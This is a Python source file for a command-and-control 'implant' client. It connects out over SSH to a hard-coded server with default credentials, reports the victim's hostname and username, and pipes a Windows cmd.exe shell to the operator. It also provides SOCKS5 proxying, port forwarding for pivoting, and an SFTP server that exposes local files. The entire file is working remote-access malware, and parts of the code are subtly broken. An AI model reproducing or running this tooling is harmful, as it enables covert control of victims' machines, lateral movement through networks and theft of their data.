import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
import struct
from typing import Dict, Any, Optional, Callable
from .sftp.stub_sftp import StubServer, StubSFTPServer

# logging setup
inglogging = logging.getLogger('C2Client')
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

# Generate a host key for the SFTP server
HOST_KEY = paramiko.RSAKey.generate(2048)

class PortForwardingManager:
    """
    Manage port forwarding: remote-to-local, local-to-remote and dynamic (SOCKS5).
    """
    def __init__(self, transport, channel):
        self.transport = transport
        self.channel = channel
        self.remote_forward_threads = {}  # Remote-to-local forwarding
        self.local_forward_threads = {}   # Local-to-remote forwarding
        self.dynamic_threads = {}         # Dynamic SOCKS5 forwarding
        self.running = True

    def start_remote_forwarding(self, remote_port: int, handler_factory: Callable) -> bool:
        """
        Start remote-to-local port forwarding with a custom channel handler
        
        Args:
            remote_port: The port to forward from the remote server
            handler_factory: A callable that returns a function to handle each accepted channel
            
        Returns:
            bool: True if forwarding was successfully set up
        """
        # Check if already forwarding on this port
        if remote_port in self.remote_forward_threads and self.remote_forward_threads[remote_port].is_alive():
            self.channel.send(f"\r\nAlready forwarding remote port {remote_port}\r\n")
            return True
            
        # Request port forwarding from the server
        try:
            self.transport.request_port_forward('', remote_port)
            logging.info(f"Requested remote port forwarding on port {remote_port}")
            self.channel.send(f"\r\nRemote forwarding started on port {remote_port}\r\n")
        except Exception as e:
            logging.error(f"Remote port forward request failed: {e}")
            self.channel.send(f"\r\nRemote port forwarding failed: {e}\r\n")
            return False

        # Thread to accept forwarded channels
        def accept_forwarded():
            port_running = True
            while self.running and port_running:
                chan = self.transport.accept(1)
                if not chan:
                    continue
                logging.info(f"Incoming forwarded-tcpip channel on remote port {remote_port}")
                
                # Start a new thread to handle this channel
                handler = handler_factory(chan)
                t = threading.Thread(target=handler, daemon=True)
                t.start()
                
            logging.info(f"Stopped accepting connections on remote port {remote_port}")

        # Start the forwarding thread
        forward_thread = threading.Thread(target=accept_forwarded, daemon=True)
        self.remote_forward_threads[remote_port] = forward_thread
        forward_thread.start()
        return True

    def stop_remote_forwarding(self, remote_port: int) -> bool:
        """
        Stop remote-to-local forwarding on the specified port
        
        Args:
            remote_port: The port to stop forwarding
            
        Returns:
            bool: True if forwarding was successfully stopped
        """
        if remote_port not in self.remote_forward_threads:
            self.channel.send(f"\r\nNo remote forwarding active on port {remote_port}\r\n")
            return True
            
        try:
            self.transport.cancel_port_forward('', remote_port)
            self.channel.send(f"\r\nCancelled remote forwarding on port {remote_port}\r\n")
            # The thread will exit on next accept() timeout
            if self.remote_forward_threads[remote_port].is_alive():
                self.remote_forward_threads[remote_port].join(2)
            del self.remote_forward_threads[remote_port]
            return True
        except Exception as e:
            logging.error(f"Cancel remote port forward failed: {e}")
            self.channel.send(f"\r\nError cancelling remote port forward: {e}\r\n")
            return False

    def start_local_forwarding(self, local_port: int, remote_host: str, remote_port: int) -> bool:
        """
        Start local-to-remote port forwarding
        
        Args:
            local_port: The local port to listen on
            remote_host: The remote host to connect to
            remote_port: The remote port to connect to
            
        Returns:
            bool: True if forwarding was successfully set up
        """
        # Check if already forwarding on this port
        if local_port in self.local_forward_threads and self.local_forward_threads[local_port].is_alive():
            self.channel.send(f"\r\nAlready forwarding local port {local_port}\r\n")
            return True
            
        # Create a socket server to listen on the local port
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind(('127.0.0.1', local_port))
            server_sock.listen(5)
            server_sock.settimeout(1)  # 1 second timeout for accept()
            
            logging.info(f"Started local port forwarding from {local_port} to {remote_host}:{remote_port}")
            self.channel.send(f"\r\nLocal forwarding started: 127.0.0.1:{local_port} -> {remote_host}:{remote_port}\r\n")
        except Exception as e:
            logging.error(f"Local port forward setup failed: {e}")
            self.channel.send(f"\r\nLocal port forwarding failed: {e}\r\n")
            return False

        # Thread to accept local connections and forward them
        def accept_local():
            port_running = True
            try:
                while self.running and port_running:
                    try:
                        client_sock, addr = server_sock.accept()
                        logging.info(f"Local connection from {addr[0]}:{addr[1]} to forward to {remote_host}:{remote_port}")
                        
                        # Open a channel to the remote host/port
                        try:
                            transport_channel = self.transport.open_channel(
                                'direct-tcpip',
                                (remote_host, remote_port),
                                addr
                            )
                            if transport_channel is None:
                                logging.error("Channel creation failed")
                                client_sock.close()
                                continue
                                
                            # Start bidirectional forwarding
                            threading.Thread(
                                target=self._bidirectional_forward,
                                args=(client_sock, transport_channel),
                                daemon=True
                            ).start()
                            
                        except Exception as e:
                            logging.error(f"Error opening channel: {e}")
                            client_sock.close()
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logging.error(f"Error accepting connection: {e}")
                        if not self.running or not port_running:
                            break
                        time.sleep(1)
            finally:
                logging.info(f"Closing local forwarding on port {local_port}")
                try:
                    server_sock.close()
                except:
                    pass

        # Start the forwarding thread
        forward_thread = threading.Thread(target=accept_local, daemon=True)
        self.local_forward_threads[local_port] = forward_thread
        forward_thread.start()
        return True

    def stop_local_forwarding(self, local_port: int) -> bool:
        """
        Stop local-to-remote forwarding on the specified port
        
        Args:
            local_port: The local port to stop forwarding
            
        Returns:
            bool: True if forwarding was successfully stopped
        """
        if local_port not in self.local_forward_threads:
            self.channel.send(f"\r\nNo local forwarding active on port {local_port}\r\n")
            return True
            
        try:
            # The thread will exit on next accept() timeout
            # We can try to connect to the port to speed up the exit
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('127.0.0.1', local_port))
                s.close()
            except:
                pass
                
            if self.local_forward_threads[local_port].is_alive():
                self.local_forward_threads[local_port].join(2)
            del self.local_forward_threads[local_port]
            self.channel.send(f"\r\nStopped local forwarding on port {local_port}\r\n")
            return True
        except Exception as e:
            logging.error(f"Stop local port forward failed: {e}")
            self.channel.send(f"\r\nError stopping local port forward: {e}\r\n")
            return False

    def start_dynamic_forwarding(self, listen_port: int) -> bool:
        """
        Start dynamic (SOCKS5) port forwarding. This creates a local SOCKS5 proxy
        that tunnels connections through the SSH connection.
        
        Args:
            listen_port: The local port to listen on for SOCKS5 connections
            
        Returns:
            bool: True if forwarding was successfully set up
        """
        # Check if already forwarding on this port
        if listen_port in self.dynamic_threads and self.dynamic_threads[listen_port].is_alive():
            self.channel.send(f"\r\nSOCKS5 proxy already running on port {listen_port}\r\n")
            return True
            
        # Create a socket server to listen for SOCKS connections
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind(('127.0.0.1', listen_port))
            server_sock.listen(5)
            server_sock.settimeout(1)  # 1 second timeout for accept()
            
            logging.info(f"Started SOCKS5 proxy on port {listen_port}")
            self.channel.send(f"\r\nSOCKS5 proxy started on 127.0.0.1:{listen_port}\r\n")
        except Exception as e:
            logging.error(f"SOCKS5 proxy setup failed: {e}")
            self.channel.send(f"\r\nSOCKS5 proxy setup failed: {e}\r\n")
            return False

        # Thread to accept SOCKS connections and handle them
        def accept_socks():
            port_running = True
            try:
                while self.running and port_running:
                    try:
                        client_sock, addr = server_sock.accept()
                        logging.info(f"SOCKS connection from {addr[0]}:{addr[1]}")
                        
                        # Start SOCKS handler in a new thread
                        threading.Thread(
                            target=self._handle_socks5_connection,
                            args=(client_sock,),
                            daemon=True
                        ).start()
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logging.error(f"Error accepting SOCKS connection: {e}")
                        if not self.running or not port_running:
                            break
                        time.sleep(1)
            finally:
                logging.info(f"Closing SOCKS5 proxy on port {listen_port}")
                try:
                    server_sock.close()
                except:
                    pass

        # Start the SOCKS proxy thread
        socks_thread = threading.Thread(target=accept_socks, daemon=True)
        self.dynamic_threads[listen_port] = socks_thread
        socks_thread.start()
        return True

    def stop_dynamic_forwarding(self, listen_port: int) -> bool:
        """
        Stop dynamic (SOCKS5) forwarding on the specified port
        
        Args:
            listen_port: The local port to stop the SOCKS5 proxy on
            
        Returns:
            bool: True if the proxy was successfully stopped
        """
        if listen_port not in self.dynamic_threads:
            self.channel.send(f"\r\nNo SOCKS5 proxy active on port {listen_port}\r\n")
            return True
            
        try:
            # The thread will exit on next accept() timeout
            # We can try to connect to the port to speed up the exit
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('127.0.0.1', listen_port))
                s.close()
            except:
                pass
                
            if self.dynamic_threads[listen_port].is_alive():
                self.dynamic_threads[listen_port].join(2)
            del self.dynamic_threads[listen_port]
            self.channel.send(f"\r\nStopped SOCKS5 proxy on port {listen_port}\r\n")
            return True
        except Exception as e:
            logging.error(f"Stop SOCKS5 proxy failed: {e}")
            self.channel.send(f"\r\nError stopping SOCKS5 proxy: {e}\r\n")
            return False

    def _handle_socks5_connection(self, client_sock):
        """
        Handle a SOCKS5 client connection according to RFC 1928
        
        Args:
            client_sock: The client socket for the SOCKS connection
        """
        try:
            # SOCKS5 handshake
            # 1. Authentication negotiation
            data = client_sock.recv(2)
            if len(data) < 2:
                logging.error("SOCKS5 handshake: too short")
                client_sock.close()
                return
                
            ver, nmethods = data[0], data[1]
            if ver != 5:  # SOCKS5
                logging.error(f"Unsupported SOCKS version: {ver}")
                client_sock.close()
                return
                
            # Read authentication methods
            methods = client_sock.recv(nmethods)
            
            # We only support no authentication (0)
            client_sock.sendall(b"\x05\x00")  # Ver=5, Method=0 (No auth)
            
            # 2. Command processing
            data = client_sock.recv(4)
            if len(data) < 4:
                logging.error("SOCKS5 request: too short")
                client_sock.close()
                return
                
            ver, cmd, rsv, atyp = data[0], data[1], data[2], data[3]
            if ver != 5:
                logging.error(f"Unexpected SOCKS version in request: {ver}")
                client_sock.close()
                return
                
            # We only support CONNECT command (1)
            if cmd != 1:
                logging.error(f"Unsupported SOCKS5 command: {cmd}")
                client_sock.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")  # Command not supported
                client_sock.close()
                return
                
            # Process address based on address type
            host = None
            if atyp == 1:  # IPv4
                addr_bytes = client_sock.recv(4)
                host = socket.inet_ntoa(addr_bytes)
            elif atyp == 3:  # Domain name
                length = client_sock.recv(1)[0]
                addr_bytes = client_sock.recv(length)
                host = addr_bytes.decode('utf-8')
            elif atyp == 4:  # IPv6
                addr_bytes = client_sock.recv(16)
                host = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                logging.error(f"Unsupported address type: {atyp}")
                client_sock.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")  # Address type not supported
                client_sock.close()
                return
                
            # Read port (2 bytes, big endian)
            port_bytes = client_sock.recv(2)
            port = struct.unpack('!H', port_bytes)[0]
            
            logging.info(f"SOCKS5 CONNECT request for {host}:{port}")
            
            try:
                # Open SSH channel to target
                channel = self.transport.open_channel(
                    'direct-tcpip',
                    (host, port),
                    client_sock.getpeername()
                )
                
                if channel is None:
                    logging.error(f"Failed to open channel to {host}:{port}")
                    client_sock.sendall(b"\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00")  # Host unreachable
                    client_sock.close()
                    return
                    
                # Connection successful - send success response
                # We use 0.0.0.0:0 as the bound address since it's not relevant
                client_sock.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                
                # Start bidirectional forwarding
                self._bidirectional_forward(client_sock, channel)
                
            except Exception as e:
                logging.error(f"Error establishing SOCKS connection: {e}")
                # General failure
                client_sock.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                client_sock.close()
                
        except Exception as e:
            logging.error(f"Error handling SOCKS connection: {e}")
            try:
                client_sock.close()
            except:
                pass

    def _bidirectional_forward(self, client_socket, channel):
        """
        Handle bidirectional forwarding between a socket and a channel
        
        Args:
            client_socket: The local client socket
            channel: The SSH channel to the remote endpoint
        """
        # Forward client -> remote
        def forward_socket_to_channel():
            try:
                while self.running:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    channel.send(data)
            except Exception as e:
                logging.debug(f"Socket to channel error: {e}")
            finally:
                try:
                    channel.close()
                except:
                    pass

        # Forward remote -> client
        def forward_channel_to_socket():
            try:
                while self.running:
                    data = channel.recv(4096)
                    if not data:
                        break
                    client_socket.sendall(data)
            except Exception as e:
                logging.debug(f"Channel to socket error: {e}")
            finally:
                try:
                    client_socket.close()
                except:
                    pass

        t1 = threading.Thread(target=forward_socket_to_channel, daemon=True)
        t2 = threading.Thread(target=forward_channel_to_socket, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    def stop_all_forwarding(self):
        """Stop all active port forwarding"""
        # Stop remote forwarding
        remote_ports = list(self.remote_forward_threads.keys())
        for port in remote_ports:
            self.stop_remote_forwarding(port)
            
        # Stop local forwarding
        local_ports = list(self.local_forward_threads.keys())
        for port in local_ports:
            self.stop_local_forwarding(port)
            
        # Stop dynamic forwarding
        dynamic_ports = list(self.dynamic_threads.keys())
        for port in dynamic_ports:
            self.stop_dynamic_forwarding(port)
            
        self.running = False
        
    # For backward compatibility
    start_forwarding = start_remote_forwarding
    stop_forwarding = stop_remote_forwarding


class SFTPService:
    """
    A class to provide SFTP service functionality.
    Uses the port forwarding manager for the underlying transport.
    """
    def __init__(self, forwarder: PortForwardingManager):
        self.forwarder = forwarder
        self.active_ports = set()

    def create_sftp_handler(self, channel):
        """Create a handler function for SFTP channels"""
        def handle_sftp_channel():
            t = paramiko.Transport(channel)
            t.add_server_key(HOST_KEY)
            StubSFTPServer.ROOT = os.getcwd()
            t.set_subsystem_handler('sftp', paramiko.SFTPServer, StubSFTPServer)
            server = StubServer()
            try:
                t.start_server(server=server)
                # serve until closed
                while t.is_active() and self.forwarder.running:
                    time.sleep(0.5)
            finally:
                t.close()
                
        return handle_sftp_channel

    def start_sftp_server(self, remote_port=3333):
        """Start SFTP server on the specified port"""
        result = self.forwarder.start_forwarding(
            remote_port, 
            self.create_sftp_handler
        )
        if result:
            self.active_ports.add(remote_port)
        return result

    def stop_sftp_server(self, remote_port=3333):
        """Stop SFTP server on the specified port"""
        result = self.forwarder.stop_forwarding(remote_port)
        if result and remote_port in self.active_ports:
            self.active_ports.remove(remote_port)
        return result

    def stop_all_servers(self):
        """Stop all SFTP servers"""
        ports = list(self.active_ports)
        for port in ports:
            self.stop_sftp_server(port)


class C2Client:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.transport = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()
        self.forwarder = None
        self.sftp_service = None

    def _gather_system_info(self) -> Dict[str, str]:
        return {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }

    def connect(self) -> bool:
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            logging.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            self.transport = self.ssh_client.get_transport()
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()

            if self.channel.active:
                # Initialize port forwarding manager and services
                self.forwarder = PortForwardingManager(self.transport, self.channel)
                self.sftp_service = SFTPService(self.forwarder)

                client_info = (
                    f"Implant checked in from {self.system_info['hostname']} "
                    f"as {self.system_info['username']}\r\n"
                )
                self.channel.send(client_info)
                logging.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logging.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        """Spawn a local Windows shell via winpty."""
        try:
            import winpty
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logging.error(f"Error starting shell: {e}")
            return False

    def forward_io(self):
        def read_from_process():
            while self.running and self.pty and self.channel and self.channel.active:
                data = self.pty.read(4096)
                if data:
                    self.channel.send(data.encode())
        
        def read_from_channel():
            while self.running and self.channel.active:
                if self.channel.recv_ready():
                    data = self.channel.recv(1024).decode()
                    if self.process_command(data):
                        continue
                    self.pty.write(data)
                else:
                    time.sleep(0.05)

        t1 = threading.Thread(target=read_from_process, daemon=True)
        t2 = threading.Thread(target=read_from_channel, daemon=True)
        t1.start(); t2.start()
        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)

    def process_command(self, command: str):
        """
        Process special commands from the server
        
        Args:
            command: The command string to process
            
        Returns:
            bool: True if the command was processed, False otherwise
        """
        parts = command.strip().split()
        if not parts:
            return False
        
        # SFTP commands
        if parts[0] == '!sftp':
            if len(parts) >= 2 and parts[1] == 'start':
                port = int(parts[2]) if len(parts) > 2 else 3333
                return self.sftp_service.start_sftp_server(port)
            if len(parts) >= 2 and parts[1] == 'stop':
                port = int(parts[2]) if len(parts) > 2 else 3333
                return self.sftp_service.stop_sftp_server(port)
            self.channel.send("Usage: !sftp start|stop [port]\r\n")
            return True
            
        # Remote port forwarding commands
        if parts[0] == '!rforward':
            if len(parts) < 2:
                self.channel.send("Usage: !rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT\r\n")
                self.channel.send("       !rforward stop REMOTE_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 5:
                    self.channel.send("Usage: !rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT\r\n")
                    return True
                    
                remote_port = int(parts[2])
                local_host = parts[3]
                local_port = int(parts[4])
                
                # Create a handler that forwards to the specified local host:port
                def create_handler(channel):
                    def handler():
                        try:
                            # Connect to local service
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((local_host, local_port))
                            # Start bidirectional forwarding
                            self.forwarder._bidirectional_forward(sock, channel)
                        except Exception as e:
                            logging.error(f"Error handling remote forwarding: {e}")
                            if channel:
                                channel.close()
                    return handler
                
                return self.forwarder.start_remote_forwarding(remote_port, create_handler)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !rforward stop REMOTE_PORT\r\n")
                    return True
                    
                remote_port = int(parts[2])
                return self.forwarder.stop_remote_forwarding(remote_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Dynamic port forwarding (SOCKS5) commands
        if parts[0] == '!dynamic':
            if len(parts) < 2:
                self.channel.send("Usage: !dynamic start LOCAL_PORT\r\n")
                self.channel.send("       !dynamic stop LOCAL_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 3:
                    self.channel.send("Usage: !dynamic start LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.start_dynamic_forwarding(local_port)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !dynamic stop LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.stop_dynamic_forwarding(local_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Local port forwarding commands
        if parts[0] == '!lforward':
            if len(parts) < 2:
                self.channel.send("Usage: !lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT\r\n")
                self.channel.send("       !lforward stop LOCAL_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 5:
                    self.channel.send("Usage: !lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                remote_host = parts[3]
                remote_port = int(parts[4])
                
                return self.forwarder.start_local_forwarding(local_port, remote_host, remote_port)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !lforward stop LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.stop_local_forwarding(local_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Status command - show all active forwarding
        if parts[0] == '!status':
            self.channel.send("\r\n=== Active Port Forwarding ===\r\n")
            
            # Remote forwarding
            if self.forwarder.remote_forward_threads:
                self.channel.send("Remote forwarding:\r\n")
                for port in self.forwarder.remote_forward_threads:
                    if self.forwarder.remote_forward_threads[port].is_alive():
                        self.channel.send(f"  Remote port {port}\r\n")
            
            # Local forwarding
            if self.forwarder.local_forward_threads:
                self.channel.send("Local forwarding:\r\n")
                for port in self.forwarder.local_forward_threads:
                    if self.forwarder.local_forward_threads[port].is_alive():
                        self.channel.send(f"  Local port {port}\r\n")
            
            # Dynamic forwarding
            if hasattr(self.forwarder, 'dynamic_threads') and self.forwarder.dynamic_threads:
                self.channel.send("Dynamic (SOCKS5) forwarding:\r\n")
                for port in self.forwarder.dynamic_threads:
                    if self.forwarder.dynamic_threads[port].is_alive():
                        self.channel.send(f"  SOCKS5 proxy on port {port}\r\n")
            
            # SFTP
            if hasattr(self, 'sftp_service') and self.sftp_service.active_ports:
                self.channel.send("SFTP servers:\r\n")
                for port in self.sftp_service.active_ports:
                    self.channel.send(f"  SFTP on port {port}\r\n")
            
            if (not self.forwarder.remote_forward_threads and 
                not self.forwarder.local_forward_threads and 
                not (hasattr(self.forwarder, 'dynamic_threads') and self.forwarder.dynamic_threads) and
                not (hasattr(self, 'sftp_service') and self.sftp_service.active_ports)):
                self.channel.send("No active forwarding\r\n")
                
            return True
        
        # General help command
        if parts[0] == '!help':
            self.channel.send("\r\n=== Available Commands ===\r\n")
            self.channel.send("!rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT - Forward remote port to local host:port\r\n")
            self.channel.send("!rforward stop REMOTE_PORT - Stop remote port forwarding\r\n")
            self.channel.send("!lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT - Forward local port to remote host:port\r\n")
            self.channel.send("!lforward stop LOCAL_PORT - Stop local port forwarding\r\n")
            self.channel.send("!dynamic start LOCAL_PORT - Start SOCKS5 proxy on local port\r\n")
            self.channel.send("!dynamic stop LOCAL_PORT - Stop SOCKS5 proxy\r\n")
            self.channel.send("!sftp start [PORT] - Start SFTP server on remote port (default: 3333)\r\n")
            self.channel.send("!sftp stop [PORT] - Stop SFTP server (default: 3333)\r\n")
            self.channel.send("!status - Show active forwarding\r\n")
            self.channel.send("!help - Show this help\r\n")
            return True
            
        # General forwarding commands (for backward compatibility)
        if parts[0] == '!forward':
            if len(parts) < 3:
                self.channel.send("Usage: !forward start|stop SERVICE PORT\r\n")
                return True
                
            action = parts[1]
            service = parts[2]
            port = int(parts[3]) if len(parts) > 3 else 3333
                
            if action == 'start':
                if service == 'sftp':
                    return self.sftp_service.start_sftp_server(port)
                elif service == 'socks':
                    return self.forwarder.start_dynamic_forwarding(port)
                else:
                    self.channel.send(f"Unknown service: {service}\r\n")
                    return True
            elif action == 'stop':
                if service == 'sftp':
                    return self.sftp_service.stop_sftp_server(port)
                elif service == 'socks':
                    return self.forwarder.stop_dynamic

    def command_loop(self):
        while self.running:
            if not self.channel or not self.channel.active:
                logging.info("Reconnecting...")
                self.disconnect()
                time.sleep(self.reconnect_delay)
                if not self.connect():
                    continue
                self.start_shell()
                threading.Thread(target=self.forward_io, daemon=True).start()
            time.sleep(1)

    def disconnect(self):
        self.running = False
        try:
            # Stop all port forwarding
            if self.forwarder:
                self.forwarder.stop_all_forwarding()
            
            # Close channels and connections
            if self.channel:
                self.channel.close()
            if self.ssh_client:
                self.ssh_client.close()
        except Exception:
            pass

    def run(self):
        if self.connect():
            self.start_shell()
            threading.Thread(target=self.forward_io, daemon=True).start()
            self.command_loop()


def parse_arguments():
    p = argparse.ArgumentParser()
    p.add_argument("--server", default="192.168.10.135")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--username", default="implant")
    p.add_argument("--password", default="implant")
    p.add_argument("--debug", action="store_true")
    return p.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logging.getLogger('C2Client').setLevel(logging.DEBUG)
    cfg = {'server_ip': args.server, 'server_port': args.port,
           'username': args.username, 'password': args.password}
    C2Client(cfg).run()


if __name__ == '__main__':
    main()